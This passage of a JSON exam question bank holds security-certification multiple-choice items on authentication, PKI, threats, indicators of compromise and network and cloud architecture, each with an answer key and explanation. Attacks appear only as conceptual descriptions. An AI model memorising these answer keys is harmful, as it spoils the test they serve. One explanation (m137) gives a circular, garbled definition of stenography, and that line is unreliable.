      "q": "A user logs into a system by swiping a badge AND entering a PIN. Which type of authentication is being used?",
      "opts": [
        "Single-factor authentication",
        "Two-factor authentication",
        "Biometric authentication",
        "Federated authentication"
      ],
      "correct": 1,
      "exp": "Two-factor authentication (2FA) combines two different factor categories. A badge is \"something you have\" and a PIN is \"something you know.\" Using two factors from different categories is MFA/2FA. Single-factor uses only one; biometric uses physical characteristics; federated uses a shared identity across domains."
    },
    {
      "id": "m108",
      "ch": "1",
      "difficulty": "medium",
      "topic": "Authentication & Authorisation",
      "q": "A large organisation uses a system where users authenticate once and can then access multiple applications without re-entering credentials. Which technology BEST describes this?",
      "opts": [
        "RADIUS",
        "Multi-factor authentication",
        "Single Sign-On (SSO)",
        "Role-Based Access Control (RBAC)"
      ],
      "correct": 2,
      "exp": "Single Sign-On (SSO) allows users to authenticate once and access multiple systems using that single authentication. RADIUS is an AAA protocol for network access. MFA adds authentication factors but does not address cross-application access. RBAC defines what authenticated users can do, not how they authenticate."
    },
    {
      "id": "m109",
      "ch": "1",
      "difficulty": "hard",
      "topic": "Authentication & Authorisation",
      "q": "Which access control model is used in military and government systems where the operating system enforces access based on data classification labels and user clearance levels — and users cannot change these permissions?",
      "opts": [
        "Discretionary Access Control (DAC)",
        "Mandatory Access Control (MAC)",
        "Role-Based Access Control (RBAC)",
        "Attribute-Based Access Control (ABAC)"
      ],
      "correct": 1,
      "exp": "Mandatory Access Control (MAC) is enforced by the operating system based on classification labels (e.g., Top Secret, Secret) and user clearances. Users cannot modify permissions — the OS controls access. DAC lets resource owners set permissions. RBAC assigns permissions to roles. ABAC uses policies based on multiple attributes."
    },
    {
      "id": "m110",
      "ch": "1",
      "difficulty": "medium",
      "topic": "PKI & Certificates",
      "q": "A website's TLS certificate was compromised before its scheduled expiry. Which PKI mechanism allows clients to check in real time whether a specific certificate has been revoked?",
      "opts": [
        "Certificate Revocation List (CRL)",
        "Online Certificate Status Protocol (OCSP)",
        "Certificate Signing Request (CSR)",
        "DNS CAA record"
      ],
      "correct": 1,
      "exp": "OCSP (Online Certificate Status Protocol) provides real-time, per-certificate revocation status by querying an OCSP responder. CRLs are periodically published lists — they are not real-time and can be large. A CSR is used to request a certificate. DNS CAA records specify which CAs may issue certificates for a domain."
    },
    {
      "id": "m111",
      "ch": "1",
      "difficulty": "medium",
      "topic": "PKI & Certificates",
      "q": "An organisation generates a key pair on its web server and sends the public key along with identity information to a Certificate Authority. What document is created for this submission?",
      "opts": [
        "Certificate Revocation List (CRL)",
        "Digital signature",
        "Certificate Signing Request (CSR)",
        "Root certificate"
      ],
      "correct": 2,
      "exp": "A Certificate Signing Request (CSR) contains the applicant's public key and identity information (Common Name, organisation, etc.) and is submitted to a CA for signing. The private key is never transmitted. The CA validates the information and returns a signed certificate. A CRL lists revoked certificates; a root certificate is self-signed by a root CA."
    },
    {
      "id": "m112",
      "ch": "1",
      "difficulty": "hard",
      "topic": "PKI & Certificates",
      "q": "An organisation wants to prevent any Certificate Authority — including rogue or compromised ones — from issuing fraudulent TLS certificates for its domain without its knowledge. Which DNS-based mechanism provides this protection?",
      "opts": [
        "DNSSEC",
        "DNS CAA (Certification Authority Authorization) records",
        "OCSP Stapling",
        "Certificate Transparency (CT) logs"
      ],
      "correct": 1,
      "exp": "DNS CAA records specify which CAs are authorised to issue certificates for a domain. A compliant CA checks CAA records before issuance. This directly restricts which CAs can issue, reducing mis-issuance risk. DNSSEC secures DNS responses. OCSP Stapling improves revocation performance. CT logs provide post-issuance transparency but don't prevent issuance."
    },
    {
      "id": "m113",
      "ch": "1",
      "difficulty": "easy",
      "topic": "Security Principles",
      "q": "The principle of least privilege states that a user or system should be given:",
      "opts": [
        "Full administrative rights to ensure they can complete all tasks",
        "Access only to the resources required to perform their specific job function",
        "Access equivalent to the most senior person in their department",
        "No access until explicitly requested through a formal process"
      ],
      "correct": 1,
      "exp": "Least privilege limits access rights to only what is necessary for a user's specific role. This minimises the blast radius if credentials are compromised. Granting excessive rights (admin, department-level) violates least privilege. The principle is not about process for requesting access — it is about scope of access granted."
    },
    {
      "id": "m114",
      "ch": "1",
      "difficulty": "medium",
      "topic": "Security Principles",
      "q": "A financial institution requires that no single employee can both approve a payment request and also execute that payment transfer. Which security principle does this enforce?",
      "opts": [
        "Least privilege",
        "Defence in depth",
        "Separation of duties",
        "Job rotation"
      ],
      "correct": 2,
      "exp": "Separation of duties requires that critical tasks be split among multiple individuals so no single person can commit fraud or error unilaterally. Least privilege limits access scope. Defence in depth layers controls. Job rotation detects fraud through exposure — it is complementary but different."
    },
    {
      "id": "m115",
      "ch": "1",
      "difficulty": "hard",
      "topic": "Security Principles",
      "q": "An organisation implements multiple overlapping security controls across physical, technical, and administrative layers so that failure of a single control does not result in a complete security breach. Which strategy is being employed?",
      "opts": [
        "Zero Trust Architecture",
        "Defence in depth",
        "Security through obscurity",
        "Risk transference"
      ],
      "correct": 1,
      "exp": "Defence in depth (also called layered security) places multiple overlapping controls across different domains so that an attacker must defeat multiple independent barriers. Zero Trust is an architecture philosophy (never trust, always verify). Security through obscurity relies on concealment alone. Risk transference shifts risk to a third party."
    },
    {
      "id": "m116",
      "ch": "1",
      "difficulty": "medium",
      "topic": "Cryptography Concepts",
      "q": "Which hashing algorithm is currently considered cryptographically broken and should NOT be used for security purposes?",
      "opts": [
        "SHA-256",
        "SHA-3",
        "MD5",
        "BLAKE2"
      ],
      "correct": 2,
      "exp": "MD5 is cryptographically broken — practical collision attacks have been demonstrated (two different inputs can produce the same hash). It should not be used for digital signatures, certificate fingerprints, or password hashing. SHA-256, SHA-3, and BLAKE2 are considered secure for current use."
    },
    {
      "id": "m117",
      "ch": "1",
      "difficulty": "easy",
      "topic": "Authentication & Authorisation",
      "q": "Which of the following is an example of a \"something you are\" authentication factor?",
      "opts": [
        "A hardware security token",
        "A one-time passcode sent via SMS",
        "A fingerprint scan",
        "A secret passphrase"
      ],
      "correct": 2,
      "exp": "\"Something you are\" refers to inherence factors — biometrics including fingerprints, retinal scans, facial recognition, and voice recognition. A hardware token is \"something you have.\" An OTP via SMS is \"something you have\" (the phone). A passphrase is \"something you know.\""
    },
    {
      "id": "m118",
      "ch": "1",
      "difficulty": "hard",
      "topic": "Cryptography Concepts",
      "q": "An organisation encrypts sensitive database backups using symmetric encryption. They want to ensure the encryption keys are protected from compromise of the application server. Which solution BEST protects the key material?",
      "opts": [
        "Store keys in a configuration file encrypted with the same key",
        "Use a Hardware Security Module (HSM) to generate and store keys",
        "Encode keys in Base64 and store in the database",
        "Rotate keys every 90 days"
      ],
      "correct": 1,
      "exp": "A Hardware Security Module (HSM) is a tamper-resistant physical device that generates, stores, and manages cryptographic keys. Keys never leave the HSM in plaintext — operations are performed inside it. Storing keys in config files (even encrypted) creates circular key protection problems. Base64 is not encryption. Rotation improves hygiene but does not protect key storage."
    },
    {
      "id": "m119",
      "ch": "1",
      "difficulty": "medium",
      "topic": "Security Principles",
      "q": "An employee who is about to leave the company still has full access to critical systems until their last day. Which IAM process failure does this represent?",
      "opts": [
        "Privilege creep",
        "Inadequate deprovisioning",
        "Separation of duties violation",
        "Excessive onboarding"
      ],
      "correct": 1,
      "exp": "Inadequate deprovisioning means access rights are not revoked promptly when an employee leaves or changes roles. This is a major insider threat risk. Privilege creep is the accumulation of excessive permissions over time. Separation of duties relates to task division. Onboarding processes grant initial access."
    },
    {
      "id": "m120",
      "ch": "1",
      "difficulty": "hard",
      "topic": "Authentication & Authorisation",
      "q": "Which protocol provides mutual authentication, uses time-limited tickets to prevent replay attacks, and never transmits passwords across the network?",
      "opts": [
        "NTLM",
        "RADIUS",
        "Kerberos",
        "LDAP"
      ],
      "correct": 2,
      "exp": "Kerberos provides mutual authentication (both client and server prove identity), uses time-limited tickets (Ticket Granting Tickets expire to prevent replay), and authenticates using cryptographic proof — passwords are only used locally to decrypt the initial TGT. NTLM is challenge-response but lacks mutual authentication. RADIUS is an AAA protocol. LDAP is a directory access protocol."
    },
    {
      "id": "m121",
      "ch": "2",
      "difficulty": "easy",
      "topic": "Threat Actors & Motivations",
      "q": "Which threat actor type is characterised by using publicly available hacking tools with limited technical skill, primarily motivated by curiosity or notoriety?",
      "opts": [
        "Nation-state actor",
        "Hacktivist",
        "Script kiddie",
        "Insider threat"
      ],
      "correct": 2,
      "exp": "A script kiddie lacks deep technical knowledge and uses pre-written tools and scripts created by others. They are typically motivated by curiosity, bragging rights, or simple disruption rather than financial gain or ideology. Nation-state actors are sophisticated and well-resourced. Hacktivists are ideologically motivated. Insiders have authorised access."
    },
    {
      "id": "m122",
      "ch": "2",
      "difficulty": "medium",
      "topic": "Threat Actors & Motivations",
      "q": "An organisation discovers that an attacker maintained undetected access to its network for 14 months, slowly exfiltrating intellectual property. Which threat category BEST describes this?",
      "opts": [
        "Opportunistic cybercrime",
        "Advanced Persistent Threat (APT)",
        "Distributed Denial of Service (DDoS)",
        "Script kiddie attack"
      ],
      "correct": 1,
      "exp": "An Advanced Persistent Threat (APT) is characterised by: Advanced tactics and custom tooling, Persistent long-term presence (months to years), and strategic Threat objectives (espionage, IP theft). The 14-month dwell time and targeted exfiltration are hallmarks of APT activity. Opportunistic crime is short-lived. DDoS disrupts availability. Script kiddies lack the sophistication for long-term stealthy operations."
    },
    {
      "id": "m123",
      "ch": "2",
      "difficulty": "easy",
      "topic": "Common Threats",
      "q": "An employee receives an email appearing to come from their bank, asking them to click a link and verify their account credentials. This is an example of:",
      "opts": [
        "Vishing",
        "Spear phishing",
        "Smishing",
        "Generic phishing"
      ],
      "correct": 3,
      "exp": "Phishing (generic) is a mass-sent fraudulent email impersonating a trusted entity to steal credentials. It is not targeted at a specific individual (that would be spear phishing) nor delivered by voice call (vishing) or SMS (smishing). The generic bank impersonation targeting any recipient is classic phishing."
    },
    {
      "id": "m124",
      "ch": "2",
      "difficulty": "medium",
      "topic": "Common Threats",
      "q": "An attacker researches a specific executive on LinkedIn, learns the names of their colleagues and current projects, and then sends a highly personalised fraudulent email appearing to come from the CFO requesting a wire transfer. This is BEST classified as:",
      "opts": [
        "Whaling",
        "Generic phishing",
        "Business Email Compromise (BEC) / Spear phishing",
        "Vishing"
      ],
      "correct": 2,
      "exp": "This is Business Email Compromise (BEC), a targeted form of spear phishing. The attacker uses OSINT (LinkedIn research) to craft a convincing, personalised attack against a specific individual. Whaling specifically targets senior executives as the victim (the executive here is the attacker's research subject, not the target). Generic phishing is mass, untargeted."
    },
    {
      "id": "m125",
      "ch": "2",
      "difficulty": "medium",
      "topic": "Common Threats",
      "q": "Which malware type does NOT require a host file to spread and can independently propagate across networks by exploiting vulnerabilities?",
      "opts": [
        "Virus",
        "Trojan",
        "Worm",
        "Ransomware"
      ],
      "correct": 2,
      "exp": "A worm is self-replicating and spreads autonomously across networks without requiring a host file or user action (unlike a virus which needs a host program). Trojans masquerade as legitimate software. Ransomware encrypts files for extortion. A virus requires attachment to an existing file."
    },
    {
      "id": "m126",
      "ch": "2",
      "difficulty": "easy",
      "topic": "Common Threats",
      "q": "A user's files are encrypted by malware, and a message demands cryptocurrency payment in exchange for the decryption key. Which malware category is this?",
      "opts": [
        "Spyware",
        "Rootkit",
        "Ransomware",
        "Adware"
      ],
      "correct": 2,
      "exp": "Ransomware encrypts victim data and demands payment (usually cryptocurrency) for the decryption key. Spyware silently collects information. Rootkits provide hidden persistent access. Adware displays unwanted advertisements."
    },
    {
      "id": "m127",
      "ch": "2",
      "difficulty": "hard",
      "topic": "Common Threats",
      "q": "An attacker modifies a legitimate software update distributed through a vendor's official update channel, inserting malicious code that is then installed by thousands of customers. Which attack vector does this represent?",
      "opts": [
        "Watering hole attack",
        "Supply chain attack",
        "Zero-day exploit",
        "Credential stuffing"
      ],
      "correct": 1,
      "exp": "A supply chain attack compromises software, hardware, or services within the supply chain rather than attacking targets directly. Inserting malicious code into a legitimate vendor update (as in the SolarWinds attack) is a prime example. A watering hole compromises websites frequented by targets. A zero-day exploits an unpatched vulnerability. Credential stuffing uses breached credentials."
    },
    {
      "id": "m128",
      "ch": "2",
      "difficulty": "medium",
      "topic": "Vulnerability Types",
      "q": "A CVSS 3.1 Base Score of 9.1 is assigned to a vulnerability. How should this be classified, and what does it indicate about remediation priority?",
      "opts": [
        "High severity — remediate within 30 days",
        "Critical severity — remediate immediately, highest priority",
        "Medium severity — remediate within 90 days",
        "Low severity — remediate during next maintenance window"
      ],
      "correct": 1,
      "exp": "CVSS 3.1 scoring: 9.0–10.0 = Critical. A score of 9.1 indicates a critical vulnerability requiring immediate, highest-priority remediation. High is 7.0–8.9; Medium is 4.0–6.9; Low is 0.1–3.9. Critical vulnerabilities often allow unauthenticated remote code execution or similar catastrophic impact."
    },
    {
      "id": "m129",
      "ch": "2",
      "difficulty": "medium",
      "topic": "Vulnerability Types",
      "q": "Which vulnerability type occurs when an application passes unsanitised user input directly to a database query, allowing an attacker to manipulate the query logic?",
      "opts": [
        "Cross-Site Scripting (XSS)",
        "Buffer overflow",
        "SQL Injection",
        "Directory traversal"
      ],
      "correct": 2,
      "exp": "SQL Injection occurs when user-supplied input is incorporated into database queries without proper sanitisation or parameterisation, allowing attackers to alter query logic, extract data, or bypass authentication. XSS injects client-side scripts. Buffer overflow corrupts memory. Directory traversal accesses files outside intended paths."
    },
    {
      "id": "m130",
      "ch": "2",
      "difficulty": "hard",
      "topic": "Vulnerability Types",
      "q": "A security researcher discovers an unpatched vulnerability in a widely deployed VPN product for which no public exploit yet exists. The researcher privately notifies the vendor. Which term describes this vulnerability before the vendor releases a patch?",
      "opts": [
        "Legacy vulnerability",
        "Known vulnerability",
        "Zero-day vulnerability",
        "Residual vulnerability"
      ],
      "correct": 2,
      "exp": "A zero-day vulnerability is one that is unknown to the software vendor or for which no patch exists. \"Zero-day\" refers to the zero days the vendor has had to address it. Once the vendor is notified and issues a patch, it becomes a \"known vulnerability.\" Legacy vulnerabilities affect end-of-life systems. Residual risk is what remains after controls are applied."
    },
    {
      "id": "m131",
      "ch": "2",
      "difficulty": "easy",
      "topic": "Indicators of Compromise",
      "q": "A security analyst notices that a workstation is making outbound connections to the same external IP address every 5 minutes, regardless of user activity. This pattern MOST likely indicates:",
      "opts": [
        "Normal Windows Update behaviour",
        "Command and Control (C2) beaconing by malware",
        "An authorised monitoring agent",
        "DNS poisoning"
      ],
      "correct": 1,
      "exp": "Regular, automated outbound connections at fixed intervals — especially to an unknown external IP regardless of user activity — are a classic indicator of Command and Control (C2) beaconing. Malware checks in with its C2 server at regular intervals to receive instructions. Windows Update does not contact single IPs at fixed intervals. Legitimate agents have known, documented destinations."
    },
    {
      "id": "m132",
      "ch": "2",
      "difficulty": "medium",
      "topic": "Indicators of Compromise",
      "q": "An EDR platform flags a process named \"explorer.exe\" running from C:\\Users\\Public\\explorer.exe. What type of attack technique does this suggest?",
      "opts": [
        "Privilege escalation",
        "Process masquerading (T1036 — Masquerading)",
        "DLL hijacking",
        "Credential dumping"
      ],
      "correct": 1,
      "exp": "Running a malicious binary with the same name as a legitimate Windows process (explorer.exe) from an unusual path (C:\\Users\\Public\\ instead of C:\\Windows\\) is process masquerading (MITRE ATT&CK T1036). Legitimate Windows processes have fixed, known locations. The non-standard path is the key indicator. This is a defence evasion technique."
    },
    {
      "id": "m133",
      "ch": "2",
      "difficulty": "easy",
      "topic": "Mitigation Techniques",
      "q": "Which mitigation technique involves dividing a network into smaller segments to limit lateral movement in the event of a breach?",
      "opts": [
        "Network Address Translation (NAT)",
        "Network segmentation",
        "Quality of Service (QoS)",
        "Bandwidth throttling"
      ],
      "correct": 1,
      "exp": "Network segmentation divides a network into isolated segments (VLANs, subnets, zones) with controlled traffic flow between them. If one segment is compromised, the attacker cannot freely move laterally to other segments. NAT translates IP addresses. QoS prioritises traffic. Bandwidth throttling limits data rates."
    },
    {
      "id": "m134",
      "ch": "2",
      "difficulty": "medium",
      "topic": "Mitigation Techniques",
      "q": "A company patches all known vulnerabilities on its servers immediately upon vendor release. However, an attacker exploits a vulnerability that was used in an attack before the patch existed. Which gap does this represent?",
      "opts": [
        "The patch management process failed",
        "The vulnerability was a zero-day — patching cannot address vulnerabilities before patches exist",
        "The company did not use antivirus software",
        "The company lacked a firewall"
      ],
      "correct": 1,
      "exp": "A zero-day vulnerability, by definition, is exploited before a patch exists. Even a perfect, immediate patching programme cannot protect against a vulnerability for which no patch has been released. This gap is addressed through compensating controls (WAF virtual patching, network segmentation, anomaly detection) until the vendor releases a fix."
    },
    {
      "id": "m135",
      "ch": "2",
      "difficulty": "hard",
      "topic": "Vulnerability Types",
      "q": "A web application allows users to upload profile images. An attacker uploads a PHP script with a .jpg extension. The server stores and executes it, granting command execution. Which TWO vulnerabilities are chained here?",
      "opts": [
        "Unrestricted file upload + insufficient file type validation",
        "SQL injection + XSS",
        "CSRF + session hijacking",
        "Directory traversal + privilege escalation"
      ],
      "correct": 0,
      "exp": "This attack chains unrestricted file upload (server accepts any file type) with insufficient file type validation (only checking extension, not MIME type or file content). The server executes uploaded files, enabling Remote Code Execution. Remediation: validate MIME type server-side, store uploads outside web root, strip execute permissions, use a CDN to serve uploads."
    },
    {
      "id": "m136",
      "ch": "2",
      "difficulty": "medium",
      "topic": "Common Threats",
      "q": "An attacker intercepts the communication between a client and web server, reads and potentially modifies the data, and forwards it to both parties without either knowing. This is BEST described as:",
      "opts": [
        "Replay attack",
        "Man-in-the-Middle (MitM) attack",
        "Denial-of-Service attack",
        "Session fixation"
      ],
      "correct": 1,
      "exp": "A Man-in-the-Middle (MitM) attack positions the attacker between two communicating parties, intercepting and potentially altering communications without their knowledge. A replay attack reuses captured valid transmissions. DoS disrupts availability. Session fixation forces a user to use a known session ID."
    },
    {
      "id": "m137",
      "ch": "2",
      "difficulty": "hard",
      "topic": "Common Threats",
      "q": "A threat intelligence report indicates attackers are embedding malicious payloads in PNG image files by storing data in unused header bytes, then hosting these images on legitimate cloud storage. Which technique is being used?",
      "opts": [
        "Stenography",
        "Steganography",
        "Polymorphic code",
        "Living off the land"
      ],
      "correct": 1,
      "exp": "Steganography conceals data within another file (image, audio, video) without visibly altering it. Attackers use it to hide malware or exfiltrated data inside innocent-looking carrier files, evading content inspection. Stenography is shorthand for stenography (court reporting). Polymorphic code changes its signature to evade AV. Living off the land uses legitimate OS tools maliciously."
    },
    {
      "id": "m138",
      "ch": "2",
      "difficulty": "medium",
      "topic": "Mitigation Techniques",
      "q": "Which control is MOST effective at preventing an attacker from escalating from a compromised DMZ web server to the internal database server?",
      "opts": [
        "Antivirus on the database server",
        "Firewall rule denying all DMZ-to-internal-DB traffic except required application ports",
        "Strong passwords on the database",
        "Logging on the web server"
      ],
      "correct": 1,
      "exp": "A firewall rule denying DMZ-to-internal traffic except for the specific application port required is the most direct and effective technical control. Even if the web server is compromised, the attacker cannot reach the DB server through a correctly configured firewall. AV, strong passwords, and logging are important but do not block network access."
    },
    {
      "id": "m139",
      "ch": "2",
      "difficulty": "easy",
      "topic": "Threat Actors & Motivations",
      "q": "Which type of threat actor is MOST commonly motivated by financial gain and typically conducts ransomware campaigns and payment card theft?",
      "opts": [
        "Nation-state actor",
        "Hacktivist",
        "Organised cybercriminal group",
        "Insider threat"
      ],
      "correct": 2,
      "exp": "Organised cybercriminal groups are primarily motivated by financial gain. Ransomware operations, payment card skimming, banking trojans, and fraud are their primary activities. Nation-state actors are motivated by espionage and geopolitical goals. Hacktivists are ideologically motivated. Insiders may be motivated by grievance, financial pressure, or coercion."
    },
    {
      "id": "m140",
      "ch": "2",
      "difficulty": "hard",
      "topic": "Indicators of Compromise",
      "q": "A threat hunter queries DNS logs and finds that a workstation is making thousands of TXT record queries to randomly generated subdomains of a single domain (e.g., x7k2.data.attacker.com, p9n1.data.attacker.com). What is the MOST likely explanation?",
      "opts": [
        "The workstation is running a legitimate DNS load test",
        "DNS tunneling — data is being encoded in DNS queries for C2 or exfiltration",
        "The DNS server is misconfigured",
        "DNS cache poisoning is in progress"
      ],
      "correct": 1,
      "exp": "DNS tunneling encodes data (C2 commands, exfiltrated data) inside DNS query/response data, exploiting the fact that DNS is rarely blocked at firewalls. Randomly generated subdomains are used to avoid caching and carry encoded payloads. The volume and pattern of TXT record queries to a single domain is a strong indicator. Mitigations: DNS inspection, RPZ (Response Policy Zones), anomaly detection."
    },
    {
      "id": "m141",
      "ch": "2",
      "difficulty": "medium",
      "topic": "Vulnerability Types",
      "q": "An application error message displays the database server hostname, software version, and stack trace when a user submits invalid input. Which vulnerability type does this represent?",
      "opts": [
        "SQL injection",
        "Improper error handling / information disclosure",
        "Insecure direct object reference",
        "Cross-site request forgery"
      ],
      "correct": 1,
      "exp": "Improper error handling (information disclosure) occurs when applications reveal internal details (stack traces, database names, software versions) in error messages. Attackers use this information to tailor further attacks. Remediation: implement generic error messages for users while logging detailed errors server-side. This is listed in OWASP Top 10 under Security Misconfiguration."
    },
    {
      "id": "m142",
      "ch": "2",
      "difficulty": "medium",
      "topic": "Mitigation Techniques",
      "q": "An organisation wants to harden its endpoints against malware that attempts to run unsigned scripts. Which Windows security feature directly addresses this?",
      "opts": [
        "Windows Firewall",
        "PowerShell Execution Policy set to AllSigned or RemoteSigned",
        "BitLocker encryption",
        "Windows Defender Antivirus"
      ],
      "correct": 1,
      "exp": "PowerShell Execution Policy set to AllSigned requires all scripts to be digitally signed by a trusted publisher, preventing unsigned malicious scripts from running. RemoteSigned requires remote scripts to be signed. Windows Firewall controls network traffic. BitLocker encrypts disks. Antivirus detects known signatures but may not catch novel unsigned scripts."
    },
    {
      "id": "m143",
      "ch": "2",
      "difficulty": "hard",
      "topic": "Common Threats",
      "q": "An attacker sends 50,000 UDP packets to random ports on a target server, each with a spoofed source IP address pointing to a victim. The target's responses flood the victim. Which attack type is this?",
      "opts": [
        "SYN flood",
        "UDP amplification / reflection attack",
        "Smurf attack",
        "Ping of Death"
      ],
      "correct": 1,
      "exp": "A UDP amplification/reflection attack spoofs the victim's IP address in requests to open servers (DNS, NTP, SSDP). The servers send their (often much larger) responses to the victim, amplifying the attack volume. A SYN flood exhausts TCP connection tables. A Smurf attack uses ICMP echo requests to broadcast addresses. Ping of Death sends oversized ICMP packets."
    },
    {
      "id": "m144",
      "ch": "2",
      "difficulty": "easy",
      "topic": "Mitigation Techniques",
      "q": "Which email authentication protocol allows domain owners to specify which IP addresses and mail servers are authorised to send email on behalf of their domain?",
      "opts": [
        "DKIM",
        "DMARC",
        "SPF",
        "S/MIME"
      ],
      "correct": 2,
      "exp": "SPF (Sender Policy Framework) is a DNS record that lists authorised mail servers for a domain. Receiving servers check SPF to verify the sending server is authorised. DKIM adds a cryptographic signature to email headers. DMARC uses SPF and DKIM to specify enforcement policy. S/MIME provides end-to-end email encryption and signing."
    },
    {
      "id": "m145",
      "ch": "2",
      "difficulty": "hard",
      "topic": "Vulnerability Types",
      "q": "A penetration tester discovers that an internal web application uses sequential numeric IDs in URLs to access user records (e.g., /account?id=1042). By incrementing the ID, they can access other users' records. Which vulnerability is this?",
      "opts": [
        "SQL Injection",
        "Broken Authentication",
        "Insecure Direct Object Reference (IDOR)",
        "Server-Side Request Forgery (SSRF)"
      ],
      "correct": 2,
      "exp": "Insecure Direct Object Reference (IDOR) occurs when an application uses user-controllable input to directly access objects (records, files) without verifying the user's authorisation to access that specific object. The fix is server-side authorisation checks on every object access request, not sequential IDs. This is in the OWASP Top 10 under Broken Access Control."
    },
    {
      "id": "m146",
      "ch": "3",
      "difficulty": "easy",
      "topic": "Network Architecture",
      "q": "A DMZ (Demilitarised Zone) is BEST described as:",
      "opts": [
        "A network segment with no internet access used for classified data",
        "A perimeter network segment hosting public-facing services, sitting between the internet and the internal network",
        "A wireless network reserved for guest users",
        "A VLAN used exclusively for management traffic"
      ],
      "correct": 1,
      "exp": "A DMZ is a network zone that sits between an external untrusted network (internet) and the internal trusted network. It hosts public-facing services (web servers, mail servers, DNS) that must be accessible from the internet while protecting the internal network. If a DMZ server is compromised, the internal network remains protected by the inner firewall."
    },
    {
      "id": "m147",
      "ch": "3",
      "difficulty": "medium",
      "topic": "Network Architecture",
      "q": "An organisation wants to ensure that a compromised guest WiFi client cannot attack internal corporate systems. Which network architecture feature MOST directly achieves this?",
      "opts": [
        "WPA3 encryption on the guest network",
        "Network segmentation with firewall rules between guest and corporate VLANs",
        "MAC address filtering on the wireless controller",
        "Disabling SSID broadcasting"
      ],
      "correct": 1,
      "exp": "Network segmentation with firewall rules between the guest and corporate VLANs is the most direct control — it enforces a security boundary at Layer 3, blocking traffic between the two segments regardless of what the guest device does. WPA3 encrypts wireless traffic but doesn't prevent lateral movement between network segments. MAC filtering is easily bypassed. SSID hiding is security through obscurity."
    },
    {
      "id": "m148",
      "ch": "3",
      "difficulty": "easy",
      "topic": "Cloud Architecture",
      "q": "In the AWS Shared Responsibility Model for IaaS (EC2 instances), which of the following is the CUSTOMER'S responsibility?",
      "opts": [
        "Physical server hardware maintenance",
        "Hypervisor patching and security",
        "Guest operating system patching and hardening",
        "Data centre physical access controls"
      ],
      "correct": 2,
      "exp": "In IaaS, the customer is responsible for guest OS patching and hardening, application security, data, and IAM configuration. The cloud provider is responsible for physical infrastructure (hardware, datacentres), the hypervisor, and the network fabric. This division is the \"shared responsibility model\" — a critical concept in cloud security."
    },
    {
      "id": "m149",
      "ch": "3",
      "difficulty": "medium",
      "topic": "Cloud Architecture",
      "q": "An organisation wants to discover unsanctioned cloud services being used by employees without IT approval. Which technology is BEST suited for this purpose?",
      "opts": [
        "Next-Generation Firewall (NGFW)",
        "Cloud Access Security Broker (CASB)",
        "Data Loss Prevention (DLP)",
        "Security Information and Event Management (SIEM)"
      ],
      "correct": 1,
      "exp": "A CASB (Cloud Access Security Broker) provides visibility into cloud service usage, including unsanctioned \"shadow IT\" applications. It sits between users and cloud services to enforce security policies. NGFW inspects traffic but doesn't provide cloud-specific visibility and policy. DLP prevents data leakage. SIEM aggregates and correlates logs for security events."
    },
    {
      "id": "m150",
      "ch": "3",
      "difficulty": "hard",
      "topic": "Cloud Architecture",
      "q": "A development team uses a Kubernetes cluster where a compromised container attempts to access the cloud provider's instance metadata service at 169.254.169.254 to steal IAM credentials. Which TWO controls MOST directly prevent this?",
      "opts": [
        "IMDSv2 enforcement (session-oriented metadata requests) combined with Kubernetes NetworkPolicies blocking pod access to 169.254.169.254",
        "Increasing container CPU limits",
        "Enabling container image scanning",
        "Using namespace isolation only"
      ],
      "correct": 0,
      "exp": "IMDSv2 requires a PUT request to create a session token before metadata can be retrieved — simple SSRF exploits that perform direct GET requests are blocked. Kubernetes NetworkPolicies can block pod-level access to the metadata IP entirely. Both together provide layered defence. Image scanning detects known vulnerabilities but not this runtime attack. Namespace isolation alone doesn't block network access to the metadata service."
    },
    {
      "id": "m151",
      "ch": "3",
      "difficulty": "easy",
      "topic": "Infrastructure Security",
      "q": "Which device operates at OSI Layer 3 and makes forwarding decisions based on destination IP addresses?",
      "opts": [
        "Hub",
        "Layer 2 switch",
        "Router",
        "Repeater"
      ],
      "correct": 2,
      "exp": "A router operates at OSI Layer 3 (Network layer) and forwards packets based on destination IP addresses using routing tables. A hub operates at Layer 1 (physical) and broadcasts to all ports. A Layer 2 switch operates at Layer 2 (Data Link) using MAC addresses. A repeater regenerates signals at Layer 1."
    },
    {
      "id": "m152",
      "ch": "3",
      "difficulty": "medium",
      "topic": "Infrastructure Security",
      "q": "An organisation configures its switches so that only one MAC address is permitted per access port, and any violation shuts down the port. Which feature is being used?",
      "opts": [
        "Dynamic ARP Inspection",
        "DHCP Snooping",
        "Port security",
        "802.1X Network Access Control"
      ],
      "correct": 2,
      "exp": "Port security on managed switches limits the number of MAC addresses permitted on a port. Violation actions include shutdown (disable port), restrict (drop violating frames), or protect (drop silently). This prevents rogue device connection and some forms of VLAN attacks. DAI validates ARP packets. DHCP Snooping validates DHCP traffic. 802.1X provides authentication before network access."
    },
    {
      "id": "m153",
      "ch": "3",
      "difficulty": "medium",
      "topic": "Network Architecture",
      "q": "Which IPSec mode encrypts ONLY the payload of the original IP packet while preserving the original IP header, and is used for end-to-end host-to-host VPN?",
      "opts": [
        "Tunnel mode",
        "Transport mode",
        "AH (Authentication Header) mode",
        "GRE mode"
      ],
      "correct": 1,
      "exp": "IPSec Transport mode encrypts only the IP payload (data), leaving the original IP header intact. It is used for direct host-to-host communication where both endpoints support IPSec. Tunnel mode encapsulates the entire original packet (header + payload) in a new IP packet — used for site-to-site VPNs. AH provides authentication and integrity but not confidentiality. GRE is a tunneling protocol, not an IPSec mode."
    },
    {
      "id": "m154",
      "ch": "3",
      "difficulty": "hard",
      "topic": "Infrastructure Security",
      "q": "A healthcare organisation connects medical IoT devices (infusion pumps, patient monitors) to its network. These devices cannot be patched and run embedded operating systems. Which architecture decision provides the MOST effective security?",
      "opts": [
        "Connect them to the main corporate network with antivirus",
        "Place them on a dedicated, isolated VLAN with strict firewall rules allowing only necessary clinical system communication",
        "Disable all network features on the medical devices",
        "Apply GPO policies to the devices"
      ],
      "correct": 1,
      "exp": "Placing unpatched IoT/medical devices on a dedicated isolated VLAN with strict firewall rules (allowing only required clinical system ports) is the most effective control. This network segmentation limits exposure — if a device is compromised, the attacker cannot reach other systems. IoT devices often cannot run antivirus or accept GPOs. Disabling network features defeats clinical functionality."
    },
    {
      "id": "m155",
      "ch": "3",
      "difficulty": "medium",
      "topic": "Application Security",
      "q": "Which security activity, performed during the DESIGN phase of the SDLC, identifies potential threats and security requirements BEFORE code is written — reducing remediation cost the most?",
      "opts": [
        "Dynamic Application Security Testing (DAST)",
        "Penetration testing",
        "Threat modelling",
        "Static Application Security Testing (SAST)"
      ],
      "correct": 2,
